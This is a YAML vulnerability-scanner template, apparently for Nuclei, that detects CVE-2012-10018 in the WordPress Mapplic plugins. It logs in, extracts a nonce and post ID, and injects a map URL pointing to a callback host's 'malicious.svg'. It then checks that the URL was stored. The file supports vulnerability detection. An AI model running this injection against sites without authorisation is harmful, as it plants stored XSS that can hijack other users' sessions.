id: CVE-2012-10018

info:
  name: WordPress Mapplic <= 6.1 / Mapplic Lite <= 1.0 - Authenticated Stored XSS via SVG File Upload
  author: KrE80r
  severity: high
  description: |
    The Mapplic and Mapplic Lite plugins for WordPress are vulnerable to Stored Cross-Site Scripting via arbitrary remote file URL injection in versions up to and including 6.1 and 1.0 respectively. This allows authenticated users with author-level permissions to inject arbitrary remote URLs for map files. When an attacker provides a URL to a malicious SVG file containing JavaScript, it results in Stored XSS that executes in the context of users viewing the map.
  impact: |
    An attacker with author-level access can inject malicious SVG files containing JavaScript payloads. When other users view the compromised map, the malicious scripts execute, potentially leading to session hijacking, credential theft, website defacement, or malware distribution.
  remediation: |
    Update Mapplic to version 7.0 or later, and Mapplic Lite to version 1.0.1 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2012-10018
    - https://wpscan.com/vulnerability/7bdee32b-9036-4e13-9586-4d6a9a1159c6/
    - https://patchstack.com/database/wordpress/plugin/mapplic-lite/vulnerability/wordpress-mapplic-lite-plugin-1-0-stored-cross-site-scripting-xss-injection-via-server-side-request-forgery-ssrf-vulnerability
    - https://patchstack.com/database/wordpress/plugin/mapplic/vulnerability/wordpress-mapplic-premium-plugin-6-1-stored-cross-site-scripting-xss-injection-via-server-side-request-forgery-ssrf-vulnerability
    - https://vulmon.com/exploitdetails?qidtp=packetstorm_exploits&qid=ac14ee13b09af933b71a33cae68c32ef
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2012-10018
    cwe-id: CWE-79
    epss-score: 0.00045
    epss-percentile: 0.17483
    cpe: cpe:2.3:a:mapplic:mapplic:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: mapplic
    product: mapplic
  tags: cve,cve2012,wordpress,wp-plugin,xss,mapplic,authenticated

variables:
  map_title: "{{rand_text_alpha(8)}}"
  map_id: "{{rand_text_alpha(6)}}"

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/post-new.php?post_type=mapplic_map HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /wp-admin/post.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _wpnonce={{nonce}}&post_ID={{post_id}}&post_title={{map_title}}&new-map-type=custom&new-map={{interactsh-url}}/malicious.svg&new-map-id={{map_id}}&new-map-name={{map_title}}&new-mapwidth=800&new-mapheight=600&action=editpost&post_type=mapplic_map
      - |
        GET /wp-admin/post.php?post={{post_id}}&action=edit HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - 'value="https?://[a-z0-9]+\.oast\.(pro|live|site|me|fun)/malicious\.svg"'
          - '"map":"https?://[a-z0-9]+\.oast\.(pro|live|site|me|fun)/malicious\.svg"'
        condition: or

      - type: word
        part: body
        words:
          - 'mapplic-admin-map'

    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        regex:
          - 'name="_wpnonce" value="([a-f0-9]+)"'
        internal: true

      - type: regex
        name: post_id
        part: body
        group: 1
        regex:
          - 'name=.post_ID. value=.(\d+).'
        internal: true
